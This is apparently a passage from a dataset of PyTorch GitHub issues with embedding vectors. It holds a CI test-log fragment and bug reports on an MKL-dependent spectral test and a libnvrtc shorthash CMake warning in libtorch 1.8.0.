Mar 12 00:47:04 Selected tests: test_ops, test_nn, distributed/rpc/test_tensorpipe_agent, test_linalg, distributed/test_distributed_spawn, distributed/rpc/test_faulty_agent, distributed/test_distributed_fork, test_spectral_ops, test_mkldnn, test_tensor_creation_ops, test_functional_autograd_benchmark, test_tensorboard, test_optim, test_binary_ufuncs, distributions/test_distributions, test_determination, test_foreach, test_type_promotion, distributed/optim/test_zero_redundancy_optimizer, distributed/test_c10d_spawn, test_cpp_api_parity, test_sort_and_select, test_fx, test_fx_experimental, test_mobile_optimizer, test_shape_ops, test_indexing, test_namedtuple_return_api, test_op_aliases, test_logging, test_testing, benchmark_utils/test_benchmark_utils, test_futures, test_numpy_interop, test_complex, test_native_functions, test_numba_integration, test_function_schema, distributed/test_jit_c10d, test_pytree, test_show_pickle, test_license, distributed/nn/jit/test_instantiator, test_public_bindings, test_dataset, test_vulkan, distributions/test_constraints, test_pruning_op, distributed/pipeline/sync/skip/test_api, distributed/pipeline/sync/skip/test_gpipe, distributed/pipeline/sync/skip/test_inspect_skip_layout, distributed/pipeline/sync/skip/test_leak, distributed/pipeline/sync/skip/test_portal, distributed/pipeline/sync/skip/test_stash_pop, distributed/pipeline/sync/skip/test_tracker, distributed/pipeline/sync/skip/test_verify_skippables, distributed/pipeline/sync/test_balance, distributed/pipeline/sync/test_bugs, distributed/pipeline/sync/test_checkpoint, distributed/pipeline/sync/test_copy, distributed/pipeline/sync/test_deferred_batch_norm, distributed/pipeline/sync/test_dependency, distributed/pipeline/sync/test_inplace, distributed/pipeline/sync/test_microbatch, distributed/pipeline/sync/test_phony, distributed/pipeline/sync/test_pipe, distributed/pipeline/sync/test_pipeline, distributed/pipeline/sync/test_stream, distributed/pipeline/sync/test_transparency, distributed/pipeline/sync/test_worker
Mar 12 00:47:04 Running test_ops ... [2021-03-12 00:47:04.744114]
Mar 12 00:47:04 Executing ['/opt/conda/bin/python', 'test_ops.py', '-v'] ... [2021-03-12 00:47:04.744142]
Mar 12 00:47:04 Grabbing reports from nightly commit: 56e7889e526256d9c16bce6ac84bdb3ea206bd79
```

cc @ezyang @seemethere @malfet @walterddr @pytorch/pytorch-dev-infra",True,"[-3.13932806e-01 -2.39371881e-01 -1.23254448e-01  7.62611032e-02
  5.14630005e-02 -2.45247900e-01  2.09122717e-01  1.79647990e-02
 -4.32848215e-01 -5.09439647e-01 -4.41688113e-02  1.00597590e-01
  1.90737918e-02 -1.71486944e-01 -9.97484103e-02 -1.89436316e-01
 -7.16786906e-02 -2.71996737e-01  1.73128515e-01 -1.82956427e-01
 -3.37034643e-01 -3.02422225e-01 -3.04121226e-01  8.75550210e-02
  3.94121185e-02  2.17095822e-01 -7.13445619e-02 -1.16033390e-01
 -1.65293068e-01  2.15045661e-01  2.31442779e-01  2.80896515e-01
 -2.99320489e-01 -1.72242634e-02  2.60107309e-01 -2.94443481e-02
 -2.38404080e-01 -3.71015519e-02 -1.39008135e-01 -7.71345198e-02
  5.69732338e-02 -6.01491518e-03 -1.20043769e-01  7.13246781e-03
 -4.73864339e-02 -1.14168495e-01 -1.20751739e-01  2.58633465e-01
  8.39159861e-02 -3.65250483e-02  1.20465219e-01 -1.39166504e-01
  2.13699192e-01 -3.23514819e-01  1.98819831e-01 -3.57189894e-01
  1.36239946e-01  2.85599977e-01 -4.16531228e-02  2.64745671e-03
  2.35950351e-02 -1.67864740e-01 -7.30051696e-02  2.43923068e-01
  1.59271568e-01  1.25006974e-01 -3.91364358e-02 -5.94700202e-02
  5.04705548e-01  8.67551491e-02  7.77915344e-02  1.41982883e-01
 -4.06036675e-01  4.06449102e-03  2.13572726e-01  8.35051239e-02
 -2.19166100e-01 -7.27794766e-02  1.37774631e-01 -2.54774690e-01
 -2.24306107e-01 -3.33203971e-01 -9.97800305e-02 -1.23410043e-03
  6.94866925e-02 -1.45243153e-01  4.16292772e-02  2.49568969e-01
  9.41890776e-02  2.48412304e-02  4.36954379e-01 -1.04060143e-01
 -1.62676245e-01  4.34153259e-01  5.55717498e-02  9.99155194e-02
  1.76326841e-01  2.14443773e-01  5.92803955e-02  1.63002908e-01
  9.81026888e-03 -4.54265356e-01 -2.52682026e-02  2.37195671e-01
 -9.20655429e-02 -2.91817248e-01  1.88747004e-01 -2.36913562e-01
  2.07637221e-01 -2.29699358e-01  1.02303952e-01 -8.95811319e-02
  1.08947843e-01 -5.39353415e-02 -2.32872404e-02  1.97129279e-01
  7.02765211e-02  1.82847232e-01 -1.61876708e-01  3.45378041e-01
  1.44550130e-01 -4.89733219e-02  1.95572972e-02  1.13718351e-03
  2.18723148e-01  4.81211171e-02  4.90489826e-02  2.72623450e-01
 -1.00544110e-01  7.92901367e-02  2.62622796e-02 -6.53097108e-02
 -2.19311696e-02 -1.50161490e-01  7.68959448e-02  8.74660015e-02
  3.23213544e-03 -2.49523014e-01  9.19652209e-02  2.41469070e-02
 -2.24103853e-02 -5.03941886e-02  1.27077356e-01 -2.51076430e-01
  7.75798112e-02 -4.43370454e-02 -1.77515388e-01  2.56683409e-01
  3.65889892e-02 -3.27399254e-01  4.38815095e-02 -2.45792344e-02
 -1.34845033e-01  3.14707935e-01  2.94041872e-01  2.88572479e-02
  3.74189198e-01  1.79976195e-01  2.15128928e-01 -2.35592455e-01
 -8.66721347e-02  5.71256280e-01 -1.69750482e-01  9.51943249e-02
  2.72734582e-01 -2.57791635e-02 -3.28798890e-01 -1.75424308e-01
 -1.94371969e-01  8.25457871e-02  2.71523476e-01 -8.56007934e-02
  1.21426940e-01 -2.68487871e-01 -3.78343999e-01 -2.30733417e-02
  7.49728084e-02 -2.38302127e-02 -2.91404258e-02  1.93489954e-01
  1.52937785e-01  1.58472598e-01  1.27306938e-01  2.72073835e-01
 -9.68953222e-02  3.26832086e-01  2.50597820e-02  2.55668879e-01
  2.91177511e-01  1.82381555e-01 -2.45936930e-01  2.76794076e-01
 -1.21671133e-01 -8.50923210e-02  4.55010645e-02  1.44133307e-02
  1.19180948e-01  2.25402303e-02  9.05451179e-02  3.36640507e-01
 -1.32138729e-01 -2.05344707e-01  2.46367633e-01 -2.49318779e-01
  5.21182775e-01  9.28033516e-02 -1.28362983e-01 -6.22498095e-01
  2.08339393e-01 -1.74797643e-02 -6.23940602e-02  3.86421122e-02
 -4.10000145e-01 -4.83974023e-03 -3.65274757e-01 -8.35392438e-03
 -2.69746959e-01  1.03010595e-01 -1.08076796e-01  1.28630012e-01
 -2.16683596e-01 -9.91275012e-02  1.09205462e-01 -3.91404629e-01
  7.24303275e-02 -2.85265706e-02 -1.83203638e-01 -2.03865156e-01
  5.64891249e-02  2.93230824e-03  3.70527096e-02  7.90307522e-02
  1.41368762e-01  1.82524651e-01  2.88964659e-01 -3.87119472e-01
  2.63668783e-03  6.22139648e-02 -2.22689837e-01  2.06740648e-01
 -9.51454639e-02  3.43887135e-04  4.71135452e-02 -1.80590674e-02
  7.30971768e-02  1.91684872e-01 -2.64860779e-01 -2.77727365e-01
 -1.36712909e-01 -6.82929307e-02 -2.16724500e-01 -3.33644152e-01
 -3.38456407e-02 -2.17534840e-01  2.98596501e-01  1.71233773e-01
  9.18269753e-02  1.65908128e-01  7.72091523e-02 -2.67215967e-01
  4.90701377e-01 -3.24653611e-02  3.50060314e-02  2.80343443e-02
  2.85880417e-01  2.50935644e-01 -2.90317386e-01  2.11896449e-01
  9.86760855e-03  2.61850327e-01  1.75404310e-01 -4.66960579e-01
  7.07896501e-02  1.28372937e-01  9.63361561e-02  1.96246393e-02
  2.76441067e-01  1.88795596e-01 -1.55839756e-01  5.36746942e-02
  3.99928316e-02  6.20007850e-02 -2.74545759e-01  3.12086940e-01
  2.61812657e-01 -1.32053956e-01 -7.38107637e-02 -7.32514039e-02
 -1.18742846e-01 -2.14120954e-01  3.66833247e-02  1.43867731e-01
  3.73812079e-01 -1.41780674e-01 -4.07455385e-01  2.47186631e-01
  2.34302804e-02 -3.00804377e-01  4.81298089e-01  3.46423626e-01
 -3.83621275e-01 -1.77789062e-01 -2.27180004e-01  1.52144283e-01
 -1.75523028e-01 -3.76296073e-01  2.24592939e-01  1.71501338e-01
  9.41500366e-02 -1.10207237e-01  1.89619437e-01  1.24842167e-01
 -6.57563508e-02  1.89734906e-01 -1.83165148e-02  2.04825878e-01
 -3.41423124e-01  4.11366522e-01 -2.52248272e-02  8.42121467e-02
 -1.01714946e-01 -1.97424397e-01 -4.53802526e-01 -2.55908929e-02
  2.28995919e-01  4.57153935e-03 -4.74817365e-01 -1.46411628e-01
 -4.06913102e-01 -1.48233742e-01 -4.10496593e-01 -2.36736685e-01
 -2.29611844e-01 -2.17926428e-01  2.13886470e-01 -1.15244478e-01
 -3.52405936e-01  4.11041141e-01  1.23275593e-01  8.03815667e-04
 -8.32718089e-02  1.63009427e-02  2.00047940e-01  7.92167559e-02
 -3.14509541e-01  1.10082939e-01  1.85362592e-01  1.79202080e-01
  8.59020427e-02 -1.17926255e-01  1.11867629e-01  1.34281069e-01
 -1.31646633e-01 -3.56056094e-01  9.77987647e-02  3.79576683e-01
  5.70796616e-03  3.08335245e-01  7.72482576e-03  4.88127053e-01
 -1.99439958e-01 -2.22411543e-01 -1.42125785e-01  5.34011051e-03
  2.20673755e-01 -4.33408171e-02 -4.77572858e-01 -2.07391500e-01
  1.61864877e-01  6.56881183e-02 -1.83945313e-01  1.79589480e-01
  9.66296159e-03  6.98384568e-02  3.23014379e-01  1.42970741e-01
  2.42502123e-01 -1.75281838e-01 -1.65403247e-01  3.43187824e-02
  2.37958476e-01  1.67458519e-01  7.11224899e-02  3.57037365e-01]"
test_stft_requires_complex in test_spectral_ops.py should be skipped if not compiled with MKL module: tests triaged module: testing,"## ðŸ› Bug

`test_stft_requires_complex` (in `test/test_spectral_ops.py`) errors if ATen is compiled without MKL. I expect that this test requires `@skipCPUIfNoMkl` before `def test_stft_requires_complex(self, device):` to skip it. I'm not sure if that test should also be skipped if there is no ROCM (which it is in the other tests in that section).

```
======================================================================
ERROR: test_stft_requires_complex_cpu (__main__.TestFFTCPU)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/rds/bear-apps/devel/eb-sjb-up/EL8/EL8-cas/software/PyTorch/1.8.0-foss-2020b/lib/python3.8/site-packages/torch/testing/_internal/common_device_type.py"", line 295, in instantiated_test
    raise rte
  File ""/rds/bear-apps/devel/eb-sjb-up/EL8/EL8-cas/software/PyTorch/1.8.0-foss-2020b/lib/python3.8/site-packages/torch/testing/_internal/common_device_type.py"", line 290, in instantiated_test
    result = test_fn(self, *args)
  File ""test_spectral_ops.py"", line 939, in test_stft_requires_complex
    y = x.stft(10, pad_mode='constant')
  File ""/rds/bear-apps/devel/eb-sjb-up/EL8/EL8-cas/software/PyTorch/1.8.0-foss-2020b/lib/python3.8/site-packages/torch/tensor.py"", line 453, in stft
    return torch.stft(self, n_fft, hop_length, win_length, window, center,
  File ""/rds/bear-apps/devel/eb-sjb-up/EL8/EL8-cas/software/PyTorch/1.8.0-foss-2020b/lib/python3.8/site-packages/torch/functional.py"", line 580, in stft
    return _VF.stft(input, n_fft, hop_length, win_length, window,  # type: ignore
RuntimeError: fft: ATen not compiled with MKL support

----------------------------------------------------------------------
```

## To Reproduce

Steps to reproduce the behavior:

1. Build PyTorch 1.8.0 release without MKL
1. Run tests

## Expected behavior

No test failure


cc @mruberry @VitalyFedyunin @walterddr",True,"[-3.02037984e-01  1.01995714e-01 -2.42929533e-01 -8.47485103e-03
  1.43699721e-01 -2.19917417e-01  1.80943310e-01  1.97294608e-01
 -4.48011816e-01 -3.14257741e-01  2.48951241e-01 -2.41083145e-01
 -1.62860285e-02 -9.07988995e-02  2.70747602e-01 -1.17047839e-01
  4.24047187e-02 -2.06356689e-01  1.91818148e-01  1.54211625e-01
  5.44742234e-02  2.53327936e-01 -5.30618019e-02  5.69146127e-02
 -1.28366187e-01 -8.43156502e-02  9.55080986e-02  5.53064123e-02
  1.42566472e-01  3.57091427e-01  4.00670856e-01  1.91171318e-01
 -4.92944092e-01  6.63947985e-02  4.49676186e-01  1.52778983e-01
 -3.42627943e-01 -3.08616936e-01 -6.53106570e-02 -1.93981528e-01
  1.86609164e-01  1.50165677e-01  7.83227682e-02 -7.71998838e-02
 -7.02199489e-02 -3.52391824e-02 -2.69320548e-01  2.93816805e-01
 -3.71772647e-01 -7.48514757e-02  1.14515476e-01 -1.80497766e-01
 -1.82143539e-01 -4.07255381e-01  2.93486327e-01 -4.51401889e-01
  3.35704051e-02  1.92039400e-01 -2.78680325e-02 -2.46142700e-01
  1.50605530e-01 -1.54463530e-01  4.22514603e-03 -1.73633814e-01
  7.00996071e-02  1.35024160e-01  7.78521821e-02 -1.53636098e-01
  7.21383154e-01  1.69567943e-01  7.20636360e-03 -2.06617713e-02
 -4.45189714e-01  2.80251000e-02 -1.49032205e-01  2.81188518e-01
 -4.76014823e-01 -2.39794344e-01 -1.52791053e-01 -3.85829508e-02
 -2.11216100e-02  2.67578781e-01  1.99110627e-01  2.15684045e-02
  2.04425335e-01  2.23906994e-01  2.19195768e-01  7.16515332e-02
  1.48052484e-01  8.80340040e-02  2.32375413e-01 -2.05854803e-01
 -3.43939960e-01  2.87065685e-01  1.43107362e-02  1.41867995e-01
  2.18788311e-01 -3.02929312e-01 -3.61550629e-01 -1.68566987e-01
  9.29228663e-02 -2.48395815e-01 -1.26115337e-01  3.64046335e-01
 -1.51714772e-01  1.78352326e-01  1.06146045e-01 -4.63391505e-02
 -1.65792275e-03 -1.96771160e-01  1.14789248e-01  3.51623297e-02
  2.92113215e-01  5.87426722e-02 -9.89511609e-04  1.47870749e-01
 -2.11793840e-01  1.01837337e-01  9.31085870e-02  2.49381885e-01
 -7.25356862e-02 -1.10872261e-01  1.30426913e-01  1.38927728e-01
  4.72360194e-01 -1.33821676e-02  6.83834255e-02  8.34105313e-02
  2.73629315e-02 -2.02463686e-01  1.64867118e-01 -1.34209827e-01
  1.49434377e-02  1.97116226e-01  3.57073307e-01 -2.81219278e-02
 -2.52855331e-01 -9.72200260e-02 -1.79990903e-01 -1.99109092e-02
 -1.49061307e-01 -4.64309417e-02 -5.86749464e-02 -9.84431803e-03
  3.15176129e-01 -1.58201382e-01 -2.33394325e-01  2.79307961e-01
 -1.40532348e-02 -2.13991344e-01  9.95298475e-02  5.70011437e-02
 -4.53622311e-01  2.10061803e-01  1.03569821e-01  1.24295816e-01
  6.26571536e-01  1.61746055e-01 -1.54505849e-01 -2.58192420e-01
  5.63549846e-02  4.82003659e-01 -4.54612374e-02  3.54386032e-01
 -9.29956883e-02  1.00606546e-01 -3.13503802e-01 -1.82453707e-01
 -3.55604410e-01  7.28489161e-02 -3.26181412e-01  2.62245908e-03
  5.59099503e-02 -1.66495502e-01  1.20170534e-01 -5.26881916e-03
 -1.71878770e-01 -4.59022164e-01  1.62608549e-01  3.33422363e-01
  2.07850635e-01 -3.51657122e-02  2.99041390e-01  5.94955608e-02
  2.11453944e-01  2.65984178e-01  3.01529050e-01  3.01957846e-01
 -8.21838528e-02 -6.83267415e-02 -3.49344820e-01 -9.06080529e-02
  9.80667099e-02 -2.01156795e-01 -2.20780015e-01 -2.83096611e-01
  3.56116354e-01  1.46852374e-01  2.45851725e-01  5.75609058e-02
 -1.86130449e-01  2.57123142e-01  2.54018486e-01  7.26294070e-02
 -1.25413656e-01  3.07739172e-02 -1.05186895e-01 -1.53284401e-01
 -3.11903730e-02  1.25132665e-01 -4.99002516e-01 -2.32752323e-01
 -2.70431787e-01 -1.94932252e-01 -2.55654812e-01  2.01613568e-02
  1.02899253e-01 -3.74110103e-01  6.14937171e-02  8.89617130e-02
 -1.16441607e-01  5.34626916e-02 -3.30389559e-01 -7.84554034e-02
 -5.04236072e-02  6.60042837e-02  5.95059097e-02  1.13540426e-01
 -2.04829976e-01 -1.33523345e-01 -4.68917117e-02 -2.30572969e-01
  3.25450212e-01  6.87522590e-02  3.22728753e-01 -5.29353730e-02
 -1.57925971e-02 -1.28034130e-01  1.95836529e-01  3.42443496e-01
 -4.53643560e-01 -3.35527390e-01  1.29215091e-01  1.38327256e-01
  2.65767813e-01  5.83306551e-02  3.38505358e-02  4.25005555e-02
 -4.13034260e-01  1.04192711e-01 -1.65615663e-01 -5.40231824e-01
 -1.24478675e-01 -1.24864064e-01  3.03789914e-01  3.53533745e-01
 -8.17760155e-02  6.13581724e-02 -5.05944081e-02 -2.11035162e-01
  1.62309557e-01  3.38505536e-01 -7.17207417e-02  2.45046198e-01
  3.08926314e-01  1.13721900e-01 -4.55734283e-01  1.63030088e-01
  1.72218874e-01 -9.49623287e-02  2.78940082e-01 -2.80771017e-01
  3.91593933e-01 -7.56937265e-02  2.22086504e-01  1.91636264e-01
  4.26715374e-01 -1.50216967e-01  1.78037528e-02  2.78113298e-02
  3.70474383e-02  1.17588595e-01 -1.60913020e-01  3.32795203e-01
  1.22746021e-01 -3.26373935e-01 -1.57339990e-01 -9.55521241e-02
 -4.79875058e-01 -1.48899913e-01 -1.19756788e-01 -3.83094214e-02
  2.79677629e-01 -1.18959852e-01 -3.98107678e-01  4.35964793e-01
  2.41052568e-01 -5.74170873e-02  2.20133424e-01 -8.75243247e-02
 -2.04226613e-01  1.70444280e-01  4.80613485e-02 -4.70730923e-02
 -1.46422669e-01 -1.87332425e-02  2.58920252e-01 -1.25925299e-02
  2.01337680e-01 -1.56893238e-01 -9.31484997e-03  7.47243389e-02
 -2.37987667e-01  3.09882522e-01 -7.82272965e-03  7.96944052e-02
 -3.23566347e-02  4.25645351e-01  3.35207433e-01  1.26113355e-01
  2.03608811e-01 -5.57177126e-01 -4.81310450e-02 -6.67366907e-02
 -1.94482952e-02 -2.92141557e-01 -4.54618156e-01 -1.40937746e-01
 -5.19872382e-02  2.08724245e-01  2.48400673e-01 -1.24232601e-02
 -2.01652721e-01  1.96406364e-01 -9.24507529e-02 -2.34680902e-03
 -3.05967238e-02  3.83980215e-01 -2.54103355e-02 -3.82514417e-01
  3.49161103e-02 -1.43365949e-01  1.64021522e-01 -2.31357321e-01
 -1.57687634e-01  1.22012615e-01  2.74964988e-01  3.73087078e-03
 -5.68200164e-02 -1.39769167e-01  1.14634551e-01  4.71348874e-04
 -4.71627682e-01  2.57973000e-02  1.73736617e-01  2.74270952e-01
  3.40906173e-01 -3.70130986e-02  2.13624075e-01  2.45096058e-01
 -3.43919545e-01  1.01711273e-01 -3.45295191e-01 -3.08955371e-01
  1.36135563e-01 -4.12241518e-01  7.89886564e-02 -2.14194477e-01
 -2.37806216e-02 -9.29188952e-02 -4.96316731e-01  9.57086012e-02
 -4.51981068e-01 -6.20474815e-02  3.34192693e-01  3.85748148e-02
 -2.63321567e-02 -1.16189234e-02 -4.00361955e-01 -6.92418665e-02
  1.90334469e-01  2.17458196e-02  1.34142116e-01 -1.11168027e-01]"
Failed to compute shorthash for libnvrtc.so when compiling application with libtorch 1.8.0 module: build triaged,"## ðŸ› Bug

When building an application with libtorch 1.8.0, I got this warning:
```console
CMake Warning at build/libtorch/share/cmake/Caffe2/public/cuda.cmake:198 (message):
  Failed to compute shorthash for libnvrtc.so
Call Stack (most recent call first):
  build/libtorch/share/cmake/Caffe2/Caffe2Config.cmake:88 (include)
  build/libtorch/share/cmake/Torch/TorchConfig.cmake:68 (find_package)
  CMakeLists.txt:109 (find_package)
```
The previous version 1.7.1 had no such warning. 

## To Reproduce

I had created a simple project to reproduce this: https://github.com/lamhoangtung/dummy-libtorch

To use it, run this on a machine with CUDA or the docker image `nvidia/cuda:11.1.1-cudnn8-devel-ubuntu20.04`:
```bash
git clone https://github.com/lamhoangtung/dummy-libtorch
cd dummy-libtorch
sudo apt update
sudo apt install unzip cmake
sh download_libtorch.sh
sh build.sh
```

The output shoud be like this:
```console
-- The C compiler identification is GNU 9.3.0
-- The CXX compiler identification is GNU 9.3.0
-- Check for working C compiler: /usr/bin/cc
-- Check for working C compiler: /usr/bin/cc -- works
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Detecting C compile features
-- Detecting C compile features - done
-- Check for working CXX compiler: /usr/bin/c++
-- Check for working CXX compiler: /usr/bin/c++ -- works
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Looking for pthread.h
-- Looking for pthread.h - found
-- Performing Test CMAKE_HAVE_LIBC_PTHREAD
-- Performing Test CMAKE_HAVE_LIBC_PTHREAD - Failed
-- Looking for pthread_create in pthreads
-- Looking for pthread_create in pthreads - not found
-- Looking for pthread_create in pthread
-- Looking for pthread_create in pthread - found
-- Found Threads: TRUE
-- Found CUDA: /usr/local/cuda-11.1 (found version ""11.1"")
-- Caffe2: CUDA detected: 11.1
-- Caffe2: CUDA nvcc is: /usr/local/cuda-11.1/bin/nvcc
-- Caffe2: CUDA toolkit directory: /usr/local/cuda-11.1
-- Caffe2: Header version is: 11.1
-- Found CUDNN: /usr/local/cuda-11.1/lib64/libcudnn.so
-- Found cuDNN: v8.1.1  (include: /usr/local/cuda-11.1/include, library: /usr/local/cuda-11.1/lib64/libcudnn.so)
CMake Warning at libtorch/share/cmake/Caffe2/public/cuda.cmake:198 (message):
  Failed to compute shorthash for libnvrtc.so
Call Stack (most recent call first):
  libtorch/share/cmake/Caffe2/Caffe2Config.cmake:88 (include)
  libtorch/share/cmake/Torch/TorchConfig.cmake:68 (find_package)
  CMakeLists.txt:4 (find_package)


-- Autodetected CUDA architecture(s):  8.6 6.1
-- Added CUDA NVCC flags for: -gencode;arch=compute_86,code=sm_86;-gencode;arch=compute_61,code=sm_61
-- Found Torch: /home/techainer/linus/dummy-libtorch/libtorch/lib/libtorch.so
-- Configuring done
-- Generating done
-- Build files have been written to: /home/techainer/linus/dummy-libtorch/build
Scanning dependencies of target simple_model
[ 50%] Building CXX object CMakeFiles/simple_model.dir/model.cpp.o
[100%] Linking CXX executable simple_model
[100%] Built target simple_model
```



## Expected behavior

No such warning above

## Environment

My environment was init from this docker images: `nvidia/cuda:11.1.1-cudnn8-devel-ubuntu20.04` 

```
PyTorch version: N/A
Is debug build: N/A
CUDA used to build PyTorch: N/A
ROCM used to build PyTorch: N/A

OS: Ubuntu 20.04.1 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
Clang version: Could not collect
CMake version: version 3.19.5

Python version: 3.8 (64-bit runtime)
Is CUDA available: N/A
CUDA runtime version: 11.1.105
GPU models and configuration:
GPU 0: GeForce GTX 1080 Ti
GPU 1: GeForce RTX 3090

Nvidia driver version: 460.56
cuDNN version: Probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.8.0.5
/usr/lib/x86_64-linux-gnu/libcudnn_adv_infer.so.8.0.5
/usr/lib/x86_64-linux-gnu/libcudnn_adv_train.so.8.0.5
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_infer.so.8.0.5
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_train.so.8.0.5
/usr/lib/x86_64-linux-gnu/libcudnn_ops_infer.so.8.0.5
/usr/lib/x86_64-linux-gnu/libcudnn_ops_train.so.8.0.5
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip] Could not collect
[conda] Could not collect
```

## Additional context

After doing some research, I found the warning will be raise from this: [cuda.cmake](https://github.com/pytorch/pytorch/blob/v1.8.0/cmake/public/cuda.cmake) file.

```cmake
 execute_process(
    COMMAND ""${PYTHON_EXECUTABLE}"" -c
    ""import hashlib;hash=hashlib.sha256();hash.update(open('${CUDA_NVRTC_LIB}','rb').read());print(hash.hexdigest()[:8])""
    RESULT_VARIABLE _retval
    OUTPUT_VARIABLE CUDA_NVRTC_SHORTHASH)
  if(NOT _retval EQUAL 0)
    message(WARNING ""Failed to compute shorthash for libnvrtc.so"")
    set(CUDA_NVRTC_SHORTHASH ""XXXXXXXX"")
```

Which mean that the python script: `""import hashlib;hash=hashlib.sha256();hash.update(open('${CUDA_NVRTC_LIB}','rb').read());print(hash.hexdigest()[:8])""` had failed.
```console
Traceback (most recent call last):
  File ""<string>"", line 1, in <module>
FileNotFoundError: [Errno 2] No such file or directory: ''
```

I suspect that my shell does not had the variable `CUDA_NVRTC_LIB` configure properly. So I tried to find it, and set it to this according to this [documentation](https://docs.nvidia.com/cuda/nvrtc/index.html):
```bash
export CUDA_NVRTC_LIB=/usr/local/cuda-11.1/include/nvrtc.h
```

And then rerun the python script above and it seems to work with an output like this:
```console
703109d3
```

But the problem `Failed to compute shorthash for libnvrtc.so` still persist when I run cmake build



cc @malfet @seemethere @walterddr",True,"[-0.18426885  0.03074102 -0.3224271   0.07397063  0.16559169 -0.40688387
 -0.01097023  0.22389746 -0.24618915 -0.21674252 -0.30115515 -0.21359639
  0.18143333  0.06888363  0.04515184  0.15868574 -0.14964597 -0.3600498
  0.10105525 -0.01119123 -0.02715379  0.22571099  0.00216276  0.13219172
  0.3001004  -0.27343547 -0.17596704 -0.1027303   0.1276223   0.19697668
  0.44077313  0.29789194 -0.03193507  0.03194544  0.08497247  0.02820455
 -0.33715087 -0.06168212 -0.21589413  0.01648451 -0.00595024  0.25476283
 -0.01163536  0.17752096 -0.17777586 -0.02683131  0.09561828  0.23399173
 -0.23707402  0.04200412  0.06334808  0.20423108  0.07706602 -0.17826764
  0.26992345 -0.09409189 -0.5786255   0.19699967  0.1919063   0.28532177
  0.32986432 -0.1436709   0.06716876 -0.13285391  0.23903114  0.4241187
  0.20153499 -0.06878758  0.18327269  0.14235179 -0.08623028 -0.14902604
 -0.17624992 -0.36147022  0.04317412  0.07904939 -0.34108204  0.18167317
 -0.25878334  0.01492763 -0.4446889   0.26762336  0.20213252  0.02364453
 -0.01242627 -0.20933132  0.28076756 -0.19006976  0.22991812 -0.02569695
  0.34242934  0.22259991 -0.33700472  0.462098   -0.23210055  0.03534455
 -0.0199185   0.04382254 -0.47401702 -0.0590857   0.14947517 -0.08738371
 -0.11967961  0.33249918  0.02464567 -0.27756843  0.17961256  0.12489256
 -0.1554312  -0.17151548  0.15780973  0.11087251  0.02728147 -0.01445028
  0.2260565   0.56782055 -0.15305847 -0.00618857 -0.07514223  0.35230866
 -0.21917444  0.11560956 -0.33711588 -0.15321778  0.01671728  0.24030772
  0.12322856 -0.2336267   0.04952198  0.11211099 -0.16455102  0.36223102
 -0.05082344 -0.11906835  0.23474291  0.10651305 -0.14684904 -0.05915398
  0.27101356 -0.16747892 -0.17292364  0.21428604 -0.14868914 -0.3482871
 -0.13422768 -0.10774948 -0.04357719  0.19280362  0.03686681 -0.26377583
 -0.08214885  0.08881022 -0.32398072  0.8026326   0.39854264  0.1635576
  0.30369338  0.02018319  0.03950469 -0.05125435  0.08834513  0.4850914
  0.02019892 -0.11156118 -0.07191882  0.07698572 -0.39321586  0.07210819
 -0.38981247 -0.09099103 -0.17281057 -0.16636455  0.18900362 -0.23325318
  0.10928023 -0.12673372  0.3511369  -0.2090562   0.2380799   0.15803087
  0.04922866  0.5390575   0.26275706 -0.04102926 -0.23577654  0.06876282
 -0.09881058 -0.07528931  0.03103256 -0.25434393 -0.32115844  0.15091571
  0.25998122  0.01981554 -0.04126302  0.02723475  0.01552283 -0.21475981
  0.38719073  0.01489267  0.28910807  0.43783766  0.3794511   0.22869593
  0.01476419 -0.10238083 -0.19768503 -0.21627963 -0.2052492  -0.10882594
 -0.30387315 -0.1990405   0.05515942 -0.24494562 -0.06316768  0.35936284
  0.10152622 -0.10723143 -0.09722342  0.27192444  0.08500192 -0.13688323
 -0.24179608 -0.18725994  0.42434007 -0.11952189 -0.16616084 -0.41636348
 -0.00570324  0.14292046 -0.24544612 -0.23666003  0.04257116 -0.18439144
  0.07561735  0.12640154 -0.24686712 -0.05442741 -0.3190375   0.05040421
  0.12077091 -0.47082135 -0.05867627 -0.2938674   0.4356193  -0.0613472
 -0.23998588 -0.13799709 -0.01564788  0.03424541  0.19534142 -0.04517338
  0.18868339  0.2260986   0.10629281  0.4401998   0.1698454   0.19480005
 -0.05054571 -0.15388077  0.09826356  0.4870347  -0.13443981  0.07798652
 -0.06594046 -0.1397765  -0.1887206   0.0023933   0.24532643 -0.06660757
  0.32038027 -0.39853138  0.34927067  0.15784957  0.35827935  0.10263574
  0.4961168  -0.14503714 -0.20049521 -0.20974709  0.08707206  0.07632923
  0.46175507 -0.06174515  0.21493387 -0.0043592  -0.184271   -0.37331438
 -0.6108521  -0.01086931 -0.27579463  0.1115576   0.40480953  0.29987186
 -0.24337488  0.13099766  0.03101433 -0.06610283  0.06245404  0.18597105
 -0.0183308   0.02302304 -0.01868475 -0.285005    0.03185837  0.2082256
  0.12486936 -0.0514552   0.420628   -0.42221817  0.3534022   0.39128044
 -0.29965907  0.35887706 -0.35243016  0.29640958 -0.27601084  0.19414367
 -0.0505779   0.00833598 -0.09652749 -0.3231674  -0.4950603  -0.17516604
  0.17135683  0.5378268  -0.3603562   0.01304211 -0.12055238 -0.1665704
  0.20686954 -0.02891059 -0.1858492   0.35352176 -0.20702885 -0.11265267
  0.10819738 -0.02642414 -0.1139212  -0.45439723 -0.08952099 -0.23164245
  0.07694671 -0.3882921  -0.26060012 -0.08916282 -0.03931955  0.3628937
 -0.38676906  0.19004917 -0.01401459  0.18018323 -0.318741   -0.18279742
 -0.00759453  0.4410814  -0.0249273   0.15780452  0.38106185  0.18324178
 -0.36718875  0.05883855 -0.11154024 -0.24738556  0.12982595 -0.21157286
 -0.39379576 -0.08359127  0.21604127  0.11536233 -0.22314776  0.0586246
 -0.08302251  0.00717509 -0.01071748  0.37563753 -0.01775678 -0.09390807
  0.04947319 -0.26827785 -0.13549879  0.02549081 -0.02578166 -0.2533505 ]"
